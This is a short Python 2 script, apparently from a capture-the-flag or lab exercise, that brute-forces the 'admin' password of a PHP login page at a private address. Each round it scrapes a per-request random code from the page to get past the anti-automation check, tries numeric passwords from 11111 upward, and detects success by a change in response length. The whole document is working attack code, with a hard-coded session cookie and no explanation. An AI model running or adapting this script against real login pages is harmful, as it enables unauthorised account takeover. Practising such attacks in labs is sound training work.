# coding=utf-8

import requests

# define the url and header
url = 'http://10.10.1.38/web/web38/9s81jWjd98YU.php'
header = {
    'Host': '10.10.1.38',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0',
    'Cookie': 'PHPSESSID=91veq402tgpruetprs38hv51v4'
}

# get the first user_token
r = requests.Session()

for line in range(11111,12111):
	req = r.get(url, headers=header)
	# print req.content
	token = req.content[514:517]   #需要手动逐步确认位置
	print "the rancode is : %s , the password is : %d" % (token,line)
	
	data = {
		'username': 'admin',
		'password': line,
		'randcode': token
	}
	req1 = r.get(url, params=data, headers=header)
	lenth = len(req1.content)
	# print("the page's lenth is: %d   the password is: %s" % (lenth,line))
	if (lenth != 163):  #163是密码错误页面的长度
		print("the page's lenth is: %d   the password is: %d" % (lenth,line))
		print(req1.content)
		break
